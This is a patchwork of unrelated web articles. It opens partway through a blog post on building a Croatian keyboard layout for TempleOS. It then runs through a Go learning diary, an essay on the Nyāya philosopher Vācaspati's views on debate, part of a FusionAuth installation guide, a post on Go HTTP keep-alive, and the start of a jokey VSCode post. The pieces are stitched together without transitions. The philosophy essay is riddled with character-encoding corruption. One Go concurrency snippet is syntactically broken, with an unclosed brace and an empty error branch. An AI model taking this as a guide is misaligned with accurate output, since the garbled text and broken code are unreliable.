    0b01000010,<br>
    0b10100101,<br>
    0b10000001,<br>
    0b11000011,<br>
    0b10111101,<br>
    0b01000010,<br>
    0b00111100,</p><p>
    
    };<br>
    text.font[255]=face[0](U64);
</p></code>

<img src="https://viktoracoric.xyz/pix/extchars.png" alt="extChars">

<p>So, we can see that 1s make the shape of smiley face, however upon creating custom character, I noticed that it was inverted on horizontal axis, so I basically just mirrored the rows horizontally, and now I got my external character.</p>

<p>Also, below this array of 8-bit values there is also a part you can notice starting with text.font, so there is some overwriting going on too. And indeed, after opening list of all characters, which can be opened by pressing <i>Ctrl+Alt+A</i>, I discovered the last character, which was just a block (every bit was 1), got overwritten with a smiley face</p>

<p>So, now that we figured out how to make custom characters, I decided to look into how to make custom key combos which would allow us to dynamically switch the keyboards.</p>

<h2>Creating custom key combos</h2>

<p>This process was fairly easy, all it took for me to find this is some digging through /Doc folder, and finding CtrlAltCBSet function, which is located inside <code>/Kernel/KeyDev.HC.Z</code> file. The process of creating custom function is very intuitive and I have no need to describe it, as it is <i>really</i> self-evident, but yeah, I decided to create a function which would print "Hello World" on a Ctrl+Alt+p keypress.</p>

<p>After modifying that file, as with any other file in kernel, recompilation is needed. We do that with <code>BootHDIns;</code>, selecting the drive (C in my case), selecting default value for partition num, pressing p to probe, selecting the number left of your disk (I overlooked this one, so I kept entering Base0 and Base1 values located below the disk), pressing enter til it starts compiling, and that's it. Simple and straightforward process</p>

<p>And that's it, after pressing Ctrl+Alt+p, I got TempleOS to print "Hello World", although in debugger mode, or as the author calls it, raw mode.</p>

<h2>Creating the font file - part 1</h2>

<p>This one took me WAY too long to figure out how it worked, way more than it should've, especially since I figured out how to make external characters.</p>

<p>File we're modifying is located at <code>/Kernel/FontStd.HC.Z</code>. Due to the way characters are written here, it reminded me of actual addresses, which I thought were hardcoded in the operating system itself somewhere. But my hacker spirit was stronger, and I decided to experiment with those "addresses", and I slapped myself in the face when I discovered these were just characters represented in hex value rather than the binary array as described in the ExtChars.HC.Z file mentioned above. So I got myself to manually draw a character on a piece of paper, write it down in binary, convert it to hexadecimal value, and then write it down. Also it's worth noting that I followed "horizontal axis reversed" logic as was described in ExtChars. But this time I found myself surprised, this one was vertically flipped as well, so I mirrored XX pairs of bytes, meaning 0xAABBCC would become 0xCCBBAA.</p>

<p>Upon the recompilation, my character was replaced with the one I created, meaning there was a success.</p>

<h2>Creating the font file - part 2</h2>

<p>I thought to myself, just modifying this file would overwrite actual english keyboard which is default, so making a copy would be wise, so I created FontHr.HC.Z inside /Kernel directory</p>

<p>I renamed sys_font_std array to sys_font_hr, and I modified keys I needed in the last few elements of the array. Now the actual problem was how to include that array into the system, how to make use of it.</p>

<p>This is where <i>the</i> most helpful function in TempleOS helped, and that is Find function, whose syntax goes like <code>F("my search query");</code>.</p>

<img src="https://viktoracoric.xyz/pix/find.png" alt="find">

<p>Pictured above is the example of find. So I went and found where else was sys_font_std located, and I stumbled upon <code>/Kernel/KMain.HC.Z</code> file, but I also realized that alongside earlier seen text.font value, there was also text.aux_font, which was font supporting Cyrillic characters. So I added the text.hr_font=sys_font_hr; line too, but obvious next move is to find text pointer and to create hr_font value.</p>

<p>Again, thanks to great find function built in the OS, I discovered that it was located in <code>KernelA.HH.Z</code> file, so I modified that file too adding the pointer I needed.</p>

<p>All I needed to do next is to create a function similar to already existing function of swapping standard font and Cyrillic font. And so I did, but the operating system didn't compile at that point</p>

<p>The easy solution was to <code>#include FontHr</code> in the file located at <code>Kernel.PRJ.Z</code>, because kernel was being compiled ahead of time, so we had to inform it that the file is there to compile.</p>

<p>After doing all of this, seemingly all is done... Unless...</p>

<h2>Font/Layout problem</h2>

<p>I thought all work was done conceptually, but then the problem arose. Just switching fonts wasn't good enough, since I effectively just replaced values of character Z to character Y (English keyboards start with "qwerty", Croatian keyboards startwith "qwertz"), so when I actually switched fonts, words displayed lost their meaning (e.g. "TempleOS rulz;" would be printed as "TempleOS rulyč") due to fundamentally different layout of keyboards, so I had to switch layouts alongside fonts too.</p>

<p>Layout file was located in <code>/Kernel/SerialDev/Keyboard.HC.Z</code>, and I saw some part included Assembly language, and the other part defined behavior you can expect from keyboards, like how it handles single keypress, reading scan codes, etc.</p>

<p>After literally hours of thinking and experimenting about possible solutions, which included MANY good but sadly failed attempts, some of which wouldn't compile at all due to AOT compilation, I FINALLY discovered the real solution.</p>

<p>I got an idea to split keyboard files into the two, one would contain assembler layout, and the other would contain rest of the functions which defined keyboard behavior.</p>

<p>After doing so, I copied the Keyboard1.HC.Z file, which was assembler part, to another file called KeyboardHr.HC.Z. After doing so, I had to modify MakeSerialDev.HC.Z file located inside <code>/Kernel/SerialDev</code> directory to exclude assembler part. Not splitting the Keyboard.HC.Z file as described above or leaving the assembler part inside makefile would cause conflicts with <code>/Kernel/KeyDev.HC.Z</code> file, which must be #include-d inside Kernel.PRJ.Z file because of inherent contradiction (A must be #include-d before B, and B must be #include-d before A, both at the same time).</p>

<p>After doing that, since I wanted dynamic switching on the keypress, I had to copy one keyboard layout to another's location. I accomplished that by making a copy of main english file, and repurposing main english file to be "main" instead. Then I copied memory blocks from Croatian keyboard layout to the main one using MemCpy function (used as <code>MemCpy(NORMAL_KEY_SCAN_DECODE_TABLE, HR_NORMAL_KEY_SCAN_DECODE_TABLE, 64);</code>. I repeated the process for shift/ctrl memory blocks too. Then I implemented mechanism for MemCpy-ing on a keypress, I named one simple variable which would be binary in nature, and I checked it upon calling the keypress function, then it would go to switch statement and reset its value inside that, alongside MemCpy that happens.</p>

<img src="https://viktoracoric.xyz/pix/function.png" alt="function">

<p>Pictured above is the example of function I described above.</p>

<p>After doing so, I only basically had to #include SerialDev/KeyboardHr and SerialDev/Keyboard before #include-ing KeyDev</p>

<p>And after recompiling and rebooting, I finally had working Croatian keyboard layout and characters, switched dynamically on demand.</p>

<h2>Conclusion</h2>

<p>As you can see, the whole process didn't involve much modifying besides the font file, but it was incredibly tough to accomplish these concepts, and my main goal was to go the least against the philosophy of the author (and against God), which in my view I accomplished very well.</p>

<p>In the near future, I plan to release a setup system which would modify and install these files onto default TempleOS installation automatically, but before doing so I have to actually finish the Croatian keyboard til end, since 0.001% features are still missing, and I want it to be 100% perfect.</p>

<p>Thank you for reading this very long post, I sincerely hope we all learned something today and that this post was informative. Any suggestions or feedback, regarding both programming or writing style …</p></div>

Its no secret you will find many articles on the web proclaiming how good Golang is, and its always been something I wanted to try out.</p><p>Until now I haven’t really had a use case and I feel its always much better to have a “need” to use something to really evaluate it, or your stuck just running through hello world’s and tutorials where your doing little more than copy/pasting working code.</p><p>The project in question is almost ready for a big reveal, but for the purposes of this article lets just say I needed a binary I could distribute without the surrounding architecture needing a runtime to run the application.</p><p>So that ruled out my two go to languages, PHP and NodeJs/Javascript. And lead me down the Golang or Rust path.</p><p>I will concede I actually attempted to use Rust first. There seems to be even more hype around Rust at present and watching all the conferences around Rust and WebAssembly that are popping up on YouTube I took a stab. As this is a Golang article I won’t delve too deep into Rust, lets just say after half a day I quickly realised if I wanted to get a proof of concept out quickly for this new project Rust was not the language I should be learning on the job for. This is by far not a knock at Rust. It looks really promising, it is probably just a little too far out of my comfort level right now.</p><p>So having wasted a half a day I picked up the Golang handbook and started a project.</p><p>I had run all the samples you can find in the <a href="https://golang.org/doc/tutorial/getting-started">documentation</a> and the <a href="https://tour.golang.org/welcome/1">tour guide</a> multiple times in the past so the core concepts like operators, values, structs etc I had an understanding of already. Packages on the other hand caused me some confusion early on which I’ll delve into further down this article.</p><h2>The Proof Of Concept</h2><p>Building the POC I dumped all my code in the <code>main</code> package. At this point the code was pretty ropey. But it did confirm for me the approach was going to work. I felt pretty at home with writing at least basic code, the syntax is very similar to PHP and javascript. Well to be more specific strongly typed PHP8.0 and Typescript.</p><p>I was getting on quite well with the language and now wanted to refactor the work into something I would be happy to commit to version control.</p><h2>Folder Structure</h2><p>This still irks me a little, it’s almost hard coded into my brain. Code goes into a <code>src</code> folder and is organised by logical groupings. At least this is how I work and is the accepted structure for the languages I use day to day.</p><p>Golang on the other hand has a different recommended structure. Its not a requirement but is recommended so I went with it. Full details can be found here: <a href="https://github.com/golang-standards/project-layout">https://github.com/golang-standards/project-layout</a></p><p>Im sure there must be a reason that’s inherent in the language or devised by some people smarter than me that makes this a better structure, but at this point I just don’t like it. It may become clearer the more I use Golang but I just feel the separation detaches the domain relationships and functionality. I don’t see why private code should be in a wholly different location when Golang has public exports inherent in the language.</p><h2>Modules</h2><p>This is where I hit my first real hurdle, maybe I didn’t read the docs well enough, or maybe it was just me. But I had a good few hours of frustration with my IDE (Intellij IDEA) shouting at me because it couldn’t find my code. At least part of the problem was my choice to just dump everything in <code>main.go</code>, then migrating to a directory type project, and finally landing on a module structure. I also think I may of been led down a few garden paths reading up on outdated articles.</p><p>I managed to figure it out eventually and it is pretty obvious with hindsight. I haven’t yet been in a position to write a module that’s meant to be consumed externally so i’m cautious of being too critical here. But from my relatively short experience I don’t understand why you can’t use relative imports in internal code?</p><p>The fact only its name is known by a package, but it needs to explicitly define the whole module path to pickup other packages feels a little off to me:</p><div><pre data-setting="{&quot;mode&quot;:&quot;go&quot;,&quot;mime&quot;:&quot;text/x-go&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:false,&quot;styleActiveLine&quot;:false,&quot;lineWrapping&quot;:false,&quot;readOnly&quot;:true,&quot;showPanel&quot;:false,&quot;language&quot;:&quot;Go&quot;,&quot;modeName&quot;:&quot;go&quot;}">package foobar
  
import (
	"github.com/xxx/xxx/internal/bazzer" // why not just "../bazzer"?
)</pre></div><h2>Dependency Loops</h2><p>Im not sure how common this is, but I had a real hard time when refactoring due to cyclic dependencies on structs. Again mainly my fault and bad design in my proof of concept. If I had started with modules up front I don’t think I would of had this issue. But the good thing that came of this is my understanding of Golang interfaces.</p><p>What I really like about them is their implicit rather than explicit nature (duck typing). When I found out about this it all became clear what I needed to do to resolve my problems.</p><h2>err != nil</h2><p>I don’t think a Golang article is complete without the mention of <code>err != nil</code>. Even before I started I knew about this. I have seen various articles propose how to write better code to prevent the repetition. Something I did pickup along the way was the use of <code>defer</code> which is a pretty neat feature allowing you to something similar to <code>try{}finally</code>. But I would be lying if I didn’t say I would be immensely grateful to see <code>try{}catch</code> make an appearance in Golang.</p><h2>Releasing</h2><p>Building the project was always super simple. I then needed to figure out how I could distribute this for different architecture. By the time I got here I was feeling pretty confident with what I had achieved, my confidence lead me to starting to reinventing a process already handled exceptionally by the <a href="https://goreleaser.com/">Goreleaser</a> and <a href="https://github.com/goreleaser/godownloader">Godownloader</a> projects. These two projects make it super simple to provide access to built copies of your app.</p><p>Which made it very surprising Godownloader seems to be struggling: <a href="https://github.com/goreleaser/godownloader/issues/161">https://github.com/goreleaser/godownloader/issues/161</a></p><p>To me these two packages feel like the composer and npm of the PHP and Javascript world i’m used to.</p><p>They appear to be a critical part of the ecosystem and certainly helped me get to a usable system very quickly.</p><p>In short a simple generated yml file and some CI scripts and I had automated releases available to the project without much customisation required.</p><h2>Conclusion</h2><p>There are definitely some things i’m not used to or fully understand. But i’m still very interested and very happy with what i’ve able to achieve pretty quickly. It has a familiar syntax which no doubt helps and I can’t believe i’ve got to the conclusion without mentioning its SUPER fast. I’ll be talking more about the specific project this was about when its ready for launch. The source code will be open source, so please don’t judge it too harshly. It will be my first Golang project, hopefully one of many.</p><h4>Want to know when I have new content? Enter your email address to be notified when it’s available.</h4></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>In premodern India,</strong> debates were entertainment in courtly settings, a sport for profiteers and clever men who enjoyed a quick turn of phrase or put-down. Successful debaters gained followers, fame, even wealth. Those pragmatic aims intertwined with nobler ones: religious believers and nonbelievers debated over deep religious truths. Both inside and outside religious traditions, participants sparred over controversies with significant social implications. Even the efficacy of medical cures was hard-fought in the debate arena.</p>
<p>During the 9th to 10th century CE, VÄ�caspati MiÅ›ra, an Indian philosopher who was part of a Hindu tradition called â€˜NyÄ�yaâ€™ (or â€˜reasonâ€™) argued that debate benefits society when it aims for truth. He thought, too, that debate helps us humans achieve ultimate happiness in our short, fragile and often painful human lives. But if debate has such noble aims, should we care about winning or losing? And if debate leads us to the truth, should we always debate everyone, everywhere? To understand VÄ�caspatiâ€™s answer, we must first understand the NyÄ�ya philosophy of debate.</p>
<p>For NyÄ�ya philosophers, we acquire ultimate happiness by ending the selfâ€™s painful cycle of rebirth, its journey from life to life, always bound to our past actions. Before we can end this cycle, we must rid ourselves of ethical vices. And this requires knowing the truth. This is why, for NyÄ�ya thinkers, a certain kind of debate is important, as it helps us learn the truth. This truth-seeking debate is called â€˜discussionâ€™ (<em>vÄ�da</em>). This required putting forward your own thesis and criticising a contrary thesis through a specific type of inference designed to convince your opponent of the truth. Discussion was hardcore, technical stuff. Still, NyÄ�ya discussion for truth doesnâ€™t use obtuse language. Its goal isnâ€™t rhetorical trickery but making someone know something. If the components of inference are in place, and the thesis presented is true, then your conversation partner would actually come to know the truth. But to work, that inference must have certain necessary components, put together in a particular form.</p>
<p>One component part of NyÄ�ya inference is a reason that both parties agree with. Itâ€™s a fallacy to use controversial or unproven reasons â€“ a fallacy which, if youâ€™re caught out on it, would disqualify you in a debate. VÄ�caspati discusses the example of an argument about the nature of sound based on it not having certain characteristics. But the problem is when the interlocutors donâ€™t agree on whether those characteristics are decisive â€“ just as light can be a wave or a particle, thereâ€™s an open enquiry about what to conclude from the observation. Until the controversy is settled, NyÄ�ya philosophers reject any argument about sound based on these particular features. So when those engaged in a discussion have opposing views, they are to put forward their best evidence in a convincing way. Even while challenging each other, they draw each other in. Bridge-building is, in some sense, built into discussion for the truth.</p>
<p>And agreement wasnâ€™t always easy to come by for Indian thinkers. There was intense disagreement over religious texts foundational for much of societyâ€™s structure, the Vedas. For example, Buddhists rejected these texts and â€“ depending on which scholars you believe â€“ much of the societal structure that came with them. They also interpret ordinary experience differently than NyÄ�ya philosophers. Think thereâ€™s a coffee cup over there? For some Buddhists, that cup is not a cup but a construction of your mind. For others, itâ€™s merely a cluster of atomic bits you call a â€˜cupâ€™. Think you have a self? Not so fast, says the self-denying Buddhist.</p>
<p>Discussion involves two truth-seekers coming together to learn from one another</p>
<p>And yet, despite the chasm between them, we have evidence that Buddhists and NyÄ�ya philosophers debated, in person and through generations of written conversation. So are NyÄ�ya philosophers premodern free-speech absolutists, for whom the desire for unbridled debate is above all else? Is debate for them an almost salvific activity, to be entered into with all comers, at all times? Would they, for instance, agree with the signatories of a recent letter to <em>Harperâ€™s</em> who argue that restricting debate â€˜invariably hurts those who lack powerâ€™ and that the â€˜way to defeat bad ideas is by exposure, argument, and persuasion, not by trying to silence or wish them awayâ€™?</p>
<p><strong>For VÄ�caspati and other</strong> NyÄ�ya philosophers, debate works only under certain conditions. It wonâ€™t always, everywhere, for everyone, result in a turn towards truth. In the background to NyÄ�ya thinking about debate are older texts, such as <em>Carakaâ€™s Compendium</em>, which urges medical experts to consider their own rhetorical and intellectual abilities, the hostility or friendliness of the audience, and the abilities of their interlocutor, before agreeing to a debate. VÄ�caspati adds additional dimensions to this calculus: the ethical stakes and the moral qualities of oneâ€™s conversation partner. And he draws the lines for our dialectic practices by distinguishing between three kinds of debate: discussion (<em>vÄ�da</em>), disputation (<em>jalpa</em>) and wrangling (<em>vitaá¹‡á¸�Ä�</em>). VÄ�caspati used these categories to work out how debateâ€™s practical aims (victory, material gain) are related to its epistemic ones (convincing, truth-seeking).</p>
<p>Discussion involves two truth-seekers coming together to learn from one another. For instance, students and teachers engage in discussion. But sometimes debate participants are focused only on winning, are prideful about their supposed â€˜knowledgeâ€™, arenâ€™t responsive to facts, and are looking for money or fame. VÄ�caspati points out that sometimes debate occurs between such less-than-honest interlocutors in front of powerful people who hold sway over large populations. In India, this was the royal court, where the winner might influence the establishment of a religion by decree. Today, this could include the court of social media, where powerful, Tweet-happy politicians influence society with a click of a mouse.</p>
<p>In his context, VÄ�caspati allows you to stoop to an apparently lower standard of rationality: faced with a powerful person spouting dangerous falsehoods and misleading people who depend on them, you might use fallacies to â€˜refuteâ€™ them. This is the second kind of debate, known as disputation (<em>jalpa</em>). In disputation, whether your argument is genuinely good matters less than its ability to convince the watching judges or crowd. Twist your opponentâ€™s words, read them literally instead of metaphorically, engage in bad reasoning â€“ itâ€™s all fair game in a disputation. Of course, returning fallacy for falsehood might not be a robust way of undermining a lie, but it could convince an easily swayed audience.</p>
<p>Should a virologist agree to a debate with a vaccine sceptic?</p>
<p>You could even engage in a third form of debate, wrangling (<em>vitaá¹‡á¸�Ä�</em>) â€“ putting forward no position, but leaving that aside for the sake of merely knocking down a dangerous person. Wrangling is often condemned as a performative contradiction: one canâ€™t truly lack a position when arguing against someone else. Why would you criticise someoneâ€™s view if you didnâ€™t think the opposite, or something close, were true? Imagine arguing against a flat-Earther, painstakingly showing their fallacious use of science and their cherrypicking of evidence. When they ask: â€˜And what do you think?â€™, you shrug. Youâ€™re just playing devilâ€™s advocate. NyÄ�ya thinkers find this attitude, which they identify in some Buddhists, dubious. A wrangler is a kind of sceptic lacking any intellectual core. Today we might think of trolls, the kind found in the darker corners of the internet, meme-generators who seem to lack any position of their own, having only glee in attacking others.</p>
<p>Taking up either strategy, disputation or wrangling, is risky and could backfire. If a judge identifies your fallacies, you lose the debate. Worse yet, your audience will conclude that your opponent is right. In VÄ�caspatiâ€™s view, when high-stakes debates occur over moral issues, if an audience is swayed, this could damage the correct order of things in a profound way. So when should a truth-seeker engage in debate with an opponent who holds opposing views, views they find morally reprehensible and potentially dangerous? Academics face this situation now and again: should a virologist agree to a debate with a vaccine sceptic? What if that debate were to be held at a local middle school, where the audience is young students without the relevant education to identify bad science? For VÄ�caspati, the answer is that our debate practices depend on our circumstances.</p>
<p><strong>In considering what</strong> to do, VÄ�caspati considers the ethical views of his opponents, worrying about the â€˜collapse of righteousnessâ€™ (<em>dharma-viplava</em>) in the situation where a malicious debater argues in front of powerful people. Yet he doesnâ€™t draw hard-and-fast lines about whom to debate based just on their views. Those people who seem to have no position of their own? Theyâ€™re welcome to join into discussion of the truth, if theyâ€™re genuinely interested in learning. And those people whose views challenge your religious perspective? NyÄ�ya philosophers famously oppose Buddhists who donâ€™t just disagree about abstract metaphysical ideas, but who challenge the religious orthodoxy of the day. And yet, over time, NyÄ�ya thinkers engage with, and even learn from, their opponents.</p>
<p>VÄ�caspati doesnâ€™t offer a flowchart about whom to debate and when. But in prioritising debate for truth, this NyÄ�ya philosopher encourages rational discussion that finds common ground even in intense disagreement. When a conversation partner ceases to participate in the joint project of truth-seeking, playing by different rules, losing any sensitivity to reality, …</p></div></div></div>

<p>
Our installation guide covers all of the different methods you can use to install FusionAuth including Docker, Homebrew, Debian packages and our quick start script. You can follow any of the methods in the <a href="https://fusionauth.io/docs/v1/tech/installation-guide/">installation guide here</a>. For this guide, we’ll use the Fast Path installation process using one of the commands below.  You may optionally install Elasticsearch to be used as the user search engine.

</div>
<p>
Once the Fast Path installer completes, we will see this output on the console:
</p>
<div>
<p>Fast Path install complete</p>
<pre><code><span></span>Downloading zip packages

Install is complete. Time for tacos.

 1. To start FusionAuth run the following command
    /Users/bpontarelli/dev/example/fusionauth/bin/startup.sh

 2. To begin, access FusionAuth by opening a browser to http://localhost:9011

 3. If you're looking for documentation, open your browser and navigate to https://fusionauth.io/docs

Thank you have a nice day.</code></pre>
</div>
</section>
</section>
<section>
<h2 id="start-fusionauth">Start FusionAuth</h2>
<p>
The next step is to start FusionAuth using the command that the Fast Path installer created. This script is called <code>startup.sh</code> and we can execute it from the installation directory like this:
</p>
<div>
<p>Startup script</p>
<pre><code data-lang="shell script"><span></span>fusionauth/bin/startup.sh</code></pre>
</div>
<p>
This will start both the <code>fusionauth-search</code> and <code>fusionauth-app</code> components, which are both required to use FusionAuth. If you are on Windows, you’ll need to use the <code>startup.bat</code> file instead.
</p>
</section>
<section>
<h2 id="complete-maintenance-mode-and-the-setup-wizard">Complete Maintenance Mode and the Setup Wizard</h2>
<p>
After we have FusionAuth installed and running, we can open our browser to <a href="http://localhost:9011/">http://localhost:9011</a>. This is the default address for FusionAuth when running locally. This will bring up FusionAuth, which should be sitting in Maintenance Mode and ready to be configured. FusionAuth enters Maintenance Mode any time the database or the Elasticsearch engine is not accessible or is not properly setup. In our case, FusionAuth likely was able to connect to both of these, but neither was ready to be used. Here’s how the Maintenance Mode screen should look:
</p>
<img alt="Maintenance Mode Database" src="https://fusionauth.io/assets/img/docs/5-minute-setup-guide/maintenance-mode-database.png" width="1200">
<p>
Here we will need to provide the super user credentials for our database along with the name of the host of the database is running on if it isn’t running locally. We can also select between MySQL and PostgreSQL and change the database port if needed. For our example, we will be using PostgreSQL on the standard port with a super username of <code>postgres</code> and a password of <code>password</code>. We can also change the username and password that will be created as the primary database account that FusionAuth will access. The reason that FusionAuth uses a separate username and password to connect to the database during normal operation is that if we encounter a breach of the FusionAuth configuration file and an attacker knows our database username and password, then the attacker will only have access to the FusionAuth database. This is helpful if we are using a single database server for multiple applications and databases. This is known as least privilege and FusionAuth tries to use this principle whenever possible.
</p>
<p>
Once we click the <strong>Submit</strong> button, we will be taken to the next step of Maintenance Mode. If you have opted to install with Elasticsearch, this step is where the FusionAuth Search component is configured, otherwise you can skip ahead to our notes on the Setup Wizard. Our Fast Path install and startup script automatically start the <code>fusionauth-search</code> component, which is a standard version of Elasticsearch. Since FusionAuth is able to connect to this search engine, all that is needed is to create the indexes inside it. This page looks like this:
</p>
<img alt="Maintenance Mode Search" src="https://fusionauth.io/assets/img/docs/5-minute-setup-guide/maintenance-mode-search.png" width="1200">
<p>
Clicking the <strong>Submit</strong> button here will cause FusionAuth to exit Maintenance Mode and begin starting up. We’ll see an interstitial page that looks like this:
</p>
<img alt="Interstitial" src="https://fusionauth.io/assets/img/docs/5-minute-setup-guide/interstitial.png" width="1200">
<p>
Once FusionAuth starts up successfully, we will be taken to the Setup Wizard. This is where we will create the administrator account for FusionAuth and accept the license. We can also sign up for the FusionAuth newsletter, which is a great way to stay up-to-date on FusionAuth releases and new features. We never pitch you, hard-sell or sell your information, so feel free to sign up. Here’s what the Setup Wizard page looks like:
</p>
<img alt="Setup Wizard" src="https://fusionauth.io/assets/img/docs/5-minute-setup-guide/setup-wizard.png" width="1200">
<p>
Clicking <strong>Submit</strong> here will complete the Setup Wizard and log us into the FusionAuth admin UI.
</p>
</section>
<section>
<h2 id="create-an-application-and-configure-the-oauth-settings">Create an Application and configure the OAuth settings</h2>
<p>
Once we arrive in the FusionAuth admin UI, the first thing we need to do is create an Application. An Application is something that a user can log into. This is the application we are building or that we are migrating to use FusionAuth. We’ll click the <span>Application</span> menu option on the left side of the page or the <strong>Setup</strong> button in the box at the top of the page.
</p>
<img alt="Dashboard to Applications" src="https://fusionauth.io/assets/img/docs/5-minute-setup-guide/dashboard-applications.png" width="1200">
<p>
This will take us to the listing page for Applications. Next, we’ll click the green plus button (the add button) at the top of the page:
</p>
<img alt="Application Listing" src="https://fusionauth.io/assets/img/docs/5-minute-setup-guide/application-listing.png" width="1200">
<p>
On the Application form, we’ll need to provide an name for our Application (only used for display purposes) and a couple of items on the OAuth tab. We’ll start with a simple setup that allows existing users to log into your application. Therefore, we won’t need to define any roles or registration configuration. If we click on the OAuth tab, we’ll see these options:
</p>
<img alt="Application Form" src="https://fusionauth.io/assets/img/docs/5-minute-setup-guide/application-form.png" width="1200">
<p>
Most of the defaults will work, but we also need to provide these items:
</p>
<ul>
<li>
<p>An authorized redirect URL. This is the route/controller in our application’s backend that will complete the OAuth workflow. In our example, we set this to <code><a href="http://localhost:3000/oauth-redirect">http://localhost:3000/oauth-redirect</a></code>. We’ll show some Node.js example code below for this route.</p>
</li>
<li>
<p>Optionally, we can specify a valid <span>Logout URL</span>. This is where the user will be redirected to after they are logged out of FusionAuth’s OAuth front-end: our application.</p>
</li>
<li>
<p>We need to ensure that the Authorization Code grant is selected in the <span>Enabled Grants</span>.</p>
</li>
</ul>
<p>
Once we have all of this configured, we’ll click the blue <strong>Save</strong> button at the top of the page.
</p>
</section>
<section>
<h2 id="copy-the-oauth-login-url-and-add-it-to-your-application">Copy the OAuth login URL and add it to your application</h2>
<p>
Once the Application has been created, we’ll be back on the listing page. From here, we can click the green View button for our new Application. This will open a dialog that contains information about the Application, including the full URL for the OAuth login page. We’ll copy this URL and paste it into our application’s HTML as a link for the user to login. Most applications have a link that says, "Login" or "My Account" for this action.
</p>
<p>
Here’s how the view dialog looks:
</p>
<img alt="Application View Dialog" src="https://fusionauth.io/assets/img/docs/5-minute-setup-guide/application-view.png" width="1200">
<p>
We can add this URL as a link to our Node.js example application in the main template. The <a href="https://github.com/FusionAuth/fusionauth-node-example">code is available</a> on the FusionAuth GitHub, and it’s recommended you download it to follow along.
</p>
<p>
Here’s how our Pug template looks:
</p>
<div>
<p>Pug Template</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><article><header><div><p><span><time datetime="2020-12-06T17:41:03+01:00">December 6, 2020</time></span>
<span>3-minute read</span></p></div></header><div><p>We all know that we should always close <code>resp.Body</code> in Go. You’re bound to see this snippet in most Go code.</p><div><pre><code data-lang="Go"><span>resp</span>, <span>err</span> <span>:=</span> <span>http</span>.<span>Get</span>(<span>url</span>)
<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
    <span>log</span>.<span>Fatal</span>(<span>err</span>)
}
<span>defer</span> <span>resp</span>.<span>Body</span>.<span>Close</span>()
</code></pre></div><p>I was intrigued by why we really need to do this, for a while now, I’ve known that the reason is that doing so frees up the connection and helps us reuse the connection for other requests internally. But like they say the <strong>detail is in the devil</strong>. I was trying to dig deeper into the <code>net/http</code> package to read and understand more around this. But of course, I deviated quite a bit. I noticed that eventhough I was firing multiple requests wireshark was only reporting 1 (YES ONE) TLS connection.</p><p>So I followed that track. I plan to come back to <code>net/http</code> sooner or later. But for now let’s first talk about HTTP, mostly about <em>Keep Alive</em> means and why it’s important.</p><blockquote><p>HTTP persistent connection, also called HTTP keep-alive, or HTTP connection reuse, is the idea of using a single TCP connection to send and receive multiple HTTP requests/responses, as opposed to opening a new connection for every single request/response pair.</p></blockquote><p>Simply said, instead of creating new connections each time, we reuse the existing connection as much as possible. This is beneficial because we get rid of the time taken for the TCP handshake for each consecutive call.</p><p>This is the base on which HTTP/2 was built and has been the default mode of operation since HTTP 1.1.</p><h2 id="http2">HTTP/2</h2><p>Let’s say we need to make 100 calls to a given domain.</p><div><pre><code data-lang="Go"><span>for</span> <span>i</span> <span>:=</span> <span>0</span>; <span>i</span> &lt; <span>100</span>; <span>i</span><span>++</span> {
    <span>resp</span>, <span>err</span> <span>:=</span> <span>http</span>.<span>Get</span>(<span>url</span>)
    <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
        <span>log</span>.<span>Fatal</span>(<span>err</span>)
    }
    
    <span>// Do something with the response here
</span><span></span>
    <span>resp</span>.<span>Body</span>.<span>Close</span>()
}
</code></pre></div><p>So if the server supports HTTP/2, that means we’ll only have a single TLS handshake (i.e. for the first request made) and the rest of the requests use the same connections. This is amazing since, TLS handshake is expensive in terms of latency.</p><p>This is simply confirmed by tracking our TCP connections on wireshark.</p><p><img src="https://nayak.io/gohttp/go_wireshark1.png" alt=""></p><p>I was curious would this still remain the same, if I ran them concurrently, would they still use the same TLS connection?</p><div><pre><code data-lang="Go"><span>for</span> <span>i</span> <span>:=</span> <span>0</span>; <span>i</span> &lt; <span>100</span>; <span>i</span><span>++</span> {
    <span>go</span> <span>func</span>() {
        <span>resp</span>, <span>err</span> <span>:=</span> <span>http</span>.<span>Get</span>(<span>url</span>)
        <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {

        <span>// Do something with the response here
</span><span></span>    } ()
}
</code></pre></div><p>PSSS: Of course I used sync.WaitGroup in my test code.</p><p><img src="https://nayak.io/gohttp/go_wireshark2.png" alt=""></p><p>Seems like the concurrency model in Go is a bit too fast it to detect that there is an existing TLS connection over which we can transmit new requests.</p><p>Also, I did try to amateurishly benchmark them, the concurrency model is much faster!!</p></div></article></section></div></div>]]>

<p>I didn’t coin the term “VSCode girl” but I’m here to teach you how to become one. It’s a lifestyle, a mindset, not a stereotype.</p>
<blockquote>
<p>VSCode girl &gt;&gt; <a href="https://www.urbandictionary.com/define.php?term=VSCO%20GIRL" target="_blank">VSCO girl</a></p>
</blockquote>
<p>We’ve emerged from the <a href="https://support.apple.com/keyboard-service-program-for-mac-notebooks" target="_blank">sticky</a> depths of MacBook butterfly keyboards to oppose our archnemesis, the tech bros.</p>
<h2 id="vscode"><a href="#vscode" aria-label="vscode permalink"></a>VSCode</h2>
<p>In order to be a VSCode Girl, you gotta <a href="https://code.visualstudio.com/download" target="_blank">download VSCode</a> and use it as your main IDE of course. What do you think I’m writing this blog post from?</p>
<p>Here are some extensions I love:</p>
<ul>
<li><a href="https://marketplace.visualstudio.com/items?itemName=howardzuo.vscode-favorites" target="_blank">favorites</a>: pin files/folders for easy access</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=eamodio.gitlens" target="_blank">GitLens</a>: the best GitHub integration</li>
<li><a href="https://marketplace.visualstudio.com/items?itemName=esbenp.prettier-vscode" target="_blank">Prettier</a>: make sure you <a href="https://scottsauber.com/2017/06/10/prettier-format-on-save-never-worry-about-formatting-javascript-again/" target="_blank">format on save</a></li>
</ul>
<h2 id="github"><a href="#github" aria-label="github permalink"></a>GitHub</h2>
<p>Ah yes, the social media platform for brogrammers.</p>
<p><img src="https://img.devrant.com/devrant/rant/r_957017_r4A2p.jpg" alt="meme"></p>
<p>You need to become “the guy she tells me not to worry about”.</p>
<h3 id="repos"><a href="#repos" aria-label="repos permalink"></a>Repos</h3>
